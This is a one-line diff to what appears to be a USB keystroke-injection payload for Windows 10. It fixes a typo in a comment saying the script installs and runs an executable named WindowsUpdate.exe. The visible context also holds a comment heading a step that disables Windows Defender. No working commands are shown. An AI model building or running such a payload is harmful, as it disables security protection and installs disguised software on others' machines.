@@ -1,6 +1,6 @@
 REM AUTHOR: Eddie Devine
 REM TARGET: Windows 10
-REM DESCRIPTION: Installs ands runs Enderman's WindowsUpdate.exe.
+REM DESCRIPTION: Installs and runs Enderman's WindowsUpdate.exe.
 REM DO NOT USE THIS SCRIPT FOR HARMFUL OR ILLEGAL PURPOSES
 
 REM Disable Windows Defender:
